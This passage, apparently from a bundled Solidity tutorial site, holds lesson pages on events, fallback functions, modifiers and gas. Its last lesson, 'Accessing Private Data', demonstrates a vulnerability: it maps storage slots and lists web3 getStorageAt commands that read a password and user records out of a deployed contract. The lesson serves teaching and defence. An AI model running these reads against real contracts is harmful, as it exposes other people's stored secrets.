class=\"hljs-comment\">// 1 ether is equal to 10^18</span>\n    <span class=\"hljs-keyword\">bool</span> <span class=\"hljs-keyword\">public</span> isOneEther = <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span> == <span class=\"hljs-number\">1e18</span>;\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Events\"\nexport const description = \"Example of how to emit events in Solidity\"\n\nconst html = `<p><code>Events</code> allow logging to the Ethereum blockchain. Some use cases for events are:</p>\n<ul>\n<li>Listening for events and updating user interface</li>\n<li>A cheap form of storage</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Event</span> </span>{\n    <span class=\"hljs-comment\">// Event declaration</span>\n    <span class=\"hljs-comment\">// Up to 3 parameters can be indexed.</span>\n    <span class=\"hljs-comment\">// Indexed parameters helps you filter the logs by the indexed parameter</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> sender, <span class=\"hljs-keyword\">string</span> message</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">AnotherLog</span>(<span class=\"hljs-params\"></span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">test</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-string\">\"Hello World!\"</span>);\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-string\">\"Hello EVM!\"</span>);\n        <span class=\"hljs-keyword\">emit</span> AnotherLog();\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Fallback\"\nexport const description = \"Example of how to use fallback in Solidity\"\n\nconst html = `<p><code>fallback</code> is a function that does not take any arguments and does not return anything.</p>\n<p>It is executed either when</p>\n<ul>\n<li>a function that does not exist is called or</li>\n<li>Ether is sent directly to a contract but <code>receive()</code> does not exist or <code>msg.data</code> is not empty</li>\n</ul>\n<p><code>fallback</code> has a 2300 gas limit when called by <code>transfer</code> or <code>send</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Fallback</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> gas</span>)</span>;\n\n    <span class=\"hljs-comment\">// Fallback function must be declared as external.</span>\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {\n        <span class=\"hljs-comment\">// send / transfer (forwards 2300 gas to this fallback function)</span>\n        <span class=\"hljs-comment\">// call (forwards all of the gas)</span>\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-built_in\">gasleft</span>());\n    }\n\n    <span class=\"hljs-comment\">// Helper function to check the balance of this contract</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">SendToFallback</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transferToFallback</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        _to.<span class=\"hljs-built_in\">transfer</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">callFallback</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        (<span class=\"hljs-keyword\">bool</span> sent,) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"First Application\"\nexport const description = \"Example of smart contract in Solidity\"\n\nconst html = `<p>Here is a simple contract that you can get, increment and decrement the count store in this contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Counter</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> count;\n\n    <span class=\"hljs-comment\">// Function to get the current count</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> count;\n    }\n\n    <span class=\"hljs-comment\">// Function to increment count by 1</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">inc</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        count += <span class=\"hljs-number\">1</span>;\n    }\n\n    <span class=\"hljs-comment\">// Function to decrement count by 1</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">dec</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        count -= <span class=\"hljs-number\">1</span>;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Function\"\nexport const description = \"Example of how to write functions in Solidity\"\n\nconst html = `<p>There are several ways to return outputs from a function.</p>\n<p>Public functions cannot accept certain data types as inputs or outputs</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Function</span> </span>{\n    <span class=\"hljs-comment\">// Functions can return multiple values.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">returnMany</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">bool</span>, <span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-number\">1</span>, <span class=\"hljs-literal\">true</span>, <span class=\"hljs-number\">2</span>);\n    }\n\n    <span class=\"hljs-comment\">// Return values can be named.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">named</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x, <span class=\"hljs-keyword\">bool</span> b, <span class=\"hljs-keyword\">uint</span> y</span>) </span>{\n        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-number\">1</span>, <span class=\"hljs-literal\">true</span>, <span class=\"hljs-number\">2</span>);\n    }\n\n    <span class=\"hljs-comment\">// Return values can be assigned to their name.</span>\n    <span class=\"hljs-comment\">// In this case the return statement can be omitted.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">assigned</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x, <span class=\"hljs-keyword\">bool</span> b, <span class=\"hljs-keyword\">uint</span> y</span>) </span>{\n        x = <span class=\"hljs-number\">1</span>;\n        b = <span class=\"hljs-literal\">true</span>;\n        y = <span class=\"hljs-number\">2</span>;\n    }\n\n    <span class=\"hljs-comment\">// Use destructing assignment when calling another</span>\n    <span class=\"hljs-comment\">// function that returns multiple values.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">destructingAssigments</span>(<span class=\"hljs-params\"></span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">bool</span>, <span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">uint</span></span>)\n    </span>{\n        (<span class=\"hljs-keyword\">uint</span> i, <span class=\"hljs-keyword\">bool</span> b, <span class=\"hljs-keyword\">uint</span> j) =  returnMany();\n\n        <span class=\"hljs-comment\">// Values can be left out.</span>\n        (<span class=\"hljs-keyword\">uint</span> x, , <span class=\"hljs-keyword\">uint</span> y) = (<span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>);\n\n        <span class=\"hljs-keyword\">return</span> (i, b, j, x, y);\n    }\n\n    <span class=\"hljs-comment\">// Cannot use map for neither input nor output</span>\n\n    <span class=\"hljs-comment\">// Can use array for input</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">arrayInput</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">memory</span> _arr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n    }\n\n    <span class=\"hljs-comment\">// Can use array for output</span>\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">arrayOutput</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> arr;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Function Modifier\"\nexport const description = \"Example of how to write function modifier in Solidity\"\n\nconst html = `<p>Modifiers are code that can be run before and / or after a function call.</p>\n<p>Modifiers can be used to:</p>\n<ul>\n<li>Restrict access</li>\n<li>Validate inputs</li>\n<li>Guard against reentrancy hack</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">FunctionModifier</span> </span>{\n    <span class=\"hljs-comment\">// We will use these variables to demonstrate how to use</span>\n    <span class=\"hljs-comment\">// modifiers.</span>\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> x = <span class=\"hljs-number\">10</span>;\n    <span class=\"hljs-keyword\">bool</span> <span class=\"hljs-keyword\">public</span> locked;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-comment\">// Set the transaction sender as the owner of the contract.</span>\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n\n    <span class=\"hljs-comment\">// Modifier to check that the caller is the owner of</span>\n    <span class=\"hljs-comment\">// the contract.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">onlyOwner</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == owner, <span class=\"hljs-string\">\"Not owner\"</span>);\n        <span class=\"hljs-comment\">// Underscore is a special character only used inside</span>\n        <span class=\"hljs-comment\">// a function modifier and it tells Solidity to</span>\n        <span class=\"hljs-comment\">// execute the rest of the code.</span>\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-comment\">// Modifiers can take inputs. This modifier checks that the</span>\n    <span class=\"hljs-comment\">// address passed in is not the zero address.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">validAddress</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(_addr != <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>), <span class=\"hljs-string\">\"Not valid address\"</span>);\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">changeOwner</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _newOwner</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyOwner</span>\n        <span class=\"hljs-title\">validAddress</span>(<span class=\"hljs-params\">_newOwner</span>)\n    </span>{\n        owner = _newOwner;\n    }\n\n    <span class=\"hljs-comment\">// Modifiers can be called before and / or after a function.</span>\n    <span class=\"hljs-comment\">// This modifier prevents a function from being called while</span>\n    <span class=\"hljs-comment\">// it is still executing.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">noReentrancy</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(!locked, <span class=\"hljs-string\">\"No reentrancy\"</span>);\n\n        locked = <span class=\"hljs-literal\">true</span>;\n        <span class=\"hljs-keyword\">_</span>;\n        locked = <span class=\"hljs-literal\">false</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">decrement</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\">noReentrancy</span> </span>{\n        x -= i;\n\n        <span class=\"hljs-keyword\">if</span> (i &gt; <span class=\"hljs-number\">1</span>) {\n            decrement(i - <span class=\"hljs-number\">1</span>);\n        }\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Gas\"\nexport const description = \"Example of gas and gas limit in Solidity\"\n\nconst html = `<h3 id=\"how-much-ether-do-you-need-to-pay-for-a-transaction\">How much <code>ether</code> do you need to pay for a transaction?</h3>\n<p>You pay <code>gas spent * gas price</code> amount of <code>ether</code>, where</p>\n<ul>\n<li><code>gas</code> is a unit of computation</li>\n<li><code>gas spent</code> is the total amount of <code>gas</code> used in a transaction</li>\n<li><code>gas price</code> is how much <code>ether</code> you are willing to pay per <code>gas</code></li>\n</ul>\n<p>Transactions with higher gas price have higher priority to be included in a block.</p>\n<p>Unspent gas will be refunded.</p>\n<h3 id=\"gas-limit\">Gas Limit</h3>\n<p>There are 2 upper bounds to the amount of gas you can spend</p>\n<ul>\n<li><code>gas limit</code> (max amount of gas your willing to use for your transaction, set by you)</li>\n<li><code>block gas limit</code> (max amount of gas allowed in a block, set by the network)</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Gas</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> i = <span class=\"hljs-number\">0</span>;\n\n    <span class=\"hljs-comment\">// Using up all of the gas that you send causes your transaction to fail.</span>\n    <span class=\"hljs-comment\">// State changes are undone.</span>\n    <span class=\"hljs-comment\">// Gas spent are not refunded.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">forever</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Here we run a loop until all of the gas are spent</span>\n        <span class=\"hljs-comment\">// and the transaction fails</span>\n        <span class=\"hljs-keyword\">while</span>(<span class=\"hljs-literal\">true</span>) {\n            i += <span class=\"hljs-number\">1</span>;\n        }\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Accessing Private Data\"\nexport const description = \"An example of accessing private data from a Solidity smart contract\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>All data on a smart contract can be read.</p>\n<p>Let&#39;s see how we can read <code>private</code> data. In the process you will learn how Solidity stores state variables.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nNote: cannot use web3 on JVM, so use the contract deployed on ropsten\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Ropsten\n0x3505a02BCDFbb225988161a95528bfDb279faD6b\n*/</span>\n\n<span class=\"hljs-comment\">/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Vault</span> </span>{\n    <span class=\"hljs-comment\">// slot 0</span>\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> count = <span class=\"hljs-number\">123</span>;\n    <span class=\"hljs-comment\">// slot 1</span>\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    <span class=\"hljs-keyword\">bool</span> <span class=\"hljs-keyword\">public</span> isTrue = <span class=\"hljs-literal\">true</span>;\n    <span class=\"hljs-keyword\">uint16</span> <span class=\"hljs-keyword\">public</span> u16 = <span class=\"hljs-number\">31</span>;\n    <span class=\"hljs-comment\">// slot 2</span>\n    <span class=\"hljs-keyword\">bytes32</span> <span class=\"hljs-keyword\">private</span> password;\n\n    <span class=\"hljs-comment\">// constants do not use storage</span>\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">constant</span> someConst = <span class=\"hljs-number\">123</span>;\n\n    <span class=\"hljs-comment\">// slot 3, 4, 5 (one for each array element)</span>\n    <span class=\"hljs-keyword\">bytes32</span>[<span class=\"hljs-number\">3</span>] <span class=\"hljs-keyword\">public</span> data;\n\n    <span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">User</span> {\n        <span class=\"hljs-keyword\">uint</span> id;\n        <span class=\"hljs-keyword\">bytes32</span> password;\n    }\n\n    <span class=\"hljs-comment\">// slot 6 - length of array</span>\n    <span class=\"hljs-comment\">// starting from slot hash(6) - array elements</span>\n    <span class=\"hljs-comment\">// slot where array element is stored = keccak256(slot)) + (index * elementSize)</span>\n    <span class=\"hljs-comment\">// where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))</span>\n    User[] <span class=\"hljs-keyword\">private</span> users;\n\n    <span class=\"hljs-comment\">// slot 7 - empty</span>\n    <span class=\"hljs-comment\">// entries are stored at hash(key, slot)</span>\n    <span class=\"hljs-comment\">// where slot = 7, key = map key</span>\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">uint</span> =&gt; User) <span class=\"hljs-keyword\">private</span> idToUser;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span> _password</span>) </span>{\n        password = _password;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">addUser</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span> _password</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        User <span class=\"hljs-keyword\">memory</span> user = User({\n            id: users.<span class=\"hljs-built_in\">length</span>,\n            password: _password\n        });\n\n        users.<span class=\"hljs-built_in\">push</span>(user);\n        idToUser[user.id] = user;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getArrayLocation</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> slot, <span class=\"hljs-keyword\">uint</span> index, <span class=\"hljs-keyword\">uint</span> elementSize</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">uint</span>(<span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(slot))) + (index * elementSize);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getMapLocation</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> slot, <span class=\"hljs-keyword\">uint</span> key</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">uint</span>(<span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(key, slot)));\n    }\n}\n\n<span class=\"hljs-comment\">/*\nslot 0 - count\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex(\"111414077815863400510004064629973595961579173665589224203503662149373724986687\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 6 })\n1st user\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f\", console.log)\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40\", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41\", console.log)\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42\", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex(\"81222191986226809103279119994707868322855741819905904417953092666699096963112\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 1 }, {type: \"uint\", value: 7})\nuser 1\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828\", console.log)\nweb3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829\", console.log)\n*/</span></code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t store sensitive information on the blockchain.</li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Block Timestamp 